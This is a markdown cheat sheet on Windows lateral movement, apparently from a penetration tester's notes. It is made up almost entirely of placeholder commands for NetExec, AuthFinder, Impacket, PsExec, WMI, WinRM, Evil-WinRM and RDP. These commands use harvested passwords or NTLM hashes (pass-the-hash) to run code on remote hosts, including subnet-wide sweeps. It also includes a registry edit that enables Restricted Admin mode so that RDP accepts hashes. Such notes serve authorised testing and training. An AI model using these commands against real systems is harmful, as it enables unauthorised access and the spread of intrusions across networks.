---
tags:
  - Foundational
  - Lateral_Movement
  - Windows
---

## Lateral Movement
resources: [HackTricks Lateral Movement](https://book.hacktricks.xyz/windows-hardening/lateral-movement), [AuthFinder GitHub](https://github.com/Real-Fruit-Snacks/authFinder)

> [!info] Move to other hosts using harvested credentials or hashes.

### NetExec - Command Execution [Local]
> [!tip] Validate creds and execute commands in one step. **Pwn3d!** = admin access.

```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -x "whoami"
```

```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -X "Get-Process"
```

```bash
nxc winrm <TargetIP> -u <Username> -p '<Password>' -X "Get-Process"
```

```bash
nxc smb <TargetIP> -u <Username> -H '<NTLMHash>' -x "whoami"
```

```bash
nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -x "whoami"
```

### AuthFinder - Auto-Method Selection [alternative]
> [!tip] Automatically tries WinRM, PSExec, SMBExec, WMI, AtExec until one succeeds.

```bash
authfinder <TargetIP> <Username> '<Password>' "whoami"
```

```bash
authfinder <TargetIP> <Username> :<NTLMHash> "whoami"
```

```bash
authfinder 192.168.1.1-50 <Username> '<Password>' "hostname" -o
```

```bash
authfinder 192.168.1.0/24 <Username> '<Password>' "whoami" --threads 20
```

### Impacket - Pass-the-Hash [Local]
```bash
impacket-psexec -hashes :<NTLMHash> Administrator@<TargetIP>
```

```bash
impacket-wmiexec -hashes :<NTLMHash> Administrator@<TargetIP>
```

```bash
impacket-smbexec -hashes :<NTLMHash> Administrator@<TargetIP>
```

### Impacket - With Password [Local]
```bash
impacket-psexec <Domain>/<Username>:'<Password>'@<TargetIP>
```

```bash
impacket-wmiexec <Domain>/<Username>:'<Password>'@<TargetIP>
```

### Impacket - Task Scheduler [Local]
> [!tip] Single command execution via Task Scheduler.

```bash
impacket-atexec -hashes :<NTLMHash> <Domain>/<Username>@<TargetIP> "whoami"
```

```bash
impacket-atexec <Domain>/<Username>:'<Password>'@<TargetIP> "whoami"
```

### PsExec - Windows Native [Remote]
```powershell
.\PsExec.exe \\<TargetHost> -u <Domain>\<Username> -p '<Password>' cmd.exe
```

```powershell
.\PsExec.exe \\<TargetHost> -u <Domain>\<Username> -p '<Password>' -s cmd.exe
```

### WMI Execution [Remote]
```powershell
wmic /node:<TargetHost> /user:<Domain>\<Username> /password:'<Password>' process call create "cmd.exe /c whoami > C:\temp\whoami.txt"
```

### WinRM - PowerShell Remoting [Remote]
```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName <TargetHost> -Credential $cred
```

```powershell
Invoke-Command -ComputerName <TargetHost> -Credential $cred -ScriptBlock { whoami }
```

```powershell
Invoke-Command -ComputerName Server1,Server2,Server3 -Credential $cred -ScriptBlock { whoami }
```

### Evil-WinRM [Local]
```bash
evil-winrm -i <TargetIP> -u <Username> -p '<Password>'
```

```bash
evil-winrm -i <TargetIP> -u <Username> -H '<NTLMHash>'
```

### RDP - Pass-the-Hash [Local]
> [!warning] Requires Restricted Admin mode enabled on target.

```bash
xfreerdp3 /u:<Username> /pth:<NTLMHash> /v:<TargetIP> /dynamic-resolution +clipboard
```

### Enable Restricted Admin Mode [Remote]
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```
